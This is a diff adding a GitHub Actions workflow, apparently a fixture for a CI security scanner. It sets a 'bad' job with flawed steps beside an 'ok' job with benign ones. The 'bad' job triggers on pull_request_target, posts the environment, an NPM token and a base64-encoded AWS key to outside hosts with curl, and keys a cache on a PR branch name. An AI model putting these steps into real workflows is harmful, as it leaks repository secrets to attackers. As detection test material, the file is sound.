@@ -1,0 +1,31 @@
+name: x
+on:
+  pull_request_target:
+permissions: {}
+jobs:
+  bad:
+    runs-on: ubuntu-latest
+    env:
+      TOKEN: ${{ secrets.NPM_TOKEN }}
+    steps:
+      - name: dump
+        run: curl -X POST -d "$(printenv)" https://collector.example.org/x
+      - name: capture
+        run: curl "https://webhook.site/abc?t=$TOKEN"
+      - name: encoded
+        run: |
+          payload=$(echo "${{ secrets.AWS_KEY }}" | base64 -w0)
+          curl -d "$payload" https://telemetry.example.net
+      - name: old cache
+        uses: actions/cache@0c45773b623bea8c8e75f6c82b208c3cf94ea4f9 # v4.0.2
+        with:
+          path: ~/.npm
+          key: npm-${{ github.event.pull_request.head.ref }}
+  ok:
+    runs-on: ubuntu-latest
+    steps:
+      - name: authenticated api call is fine
+        run: |
+          curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}" https://api.github.com/repos/acme/app
+      - name: write download into env file is fine
+        run: curl -sSf https://example.com/version >> $GITHUB_ENV
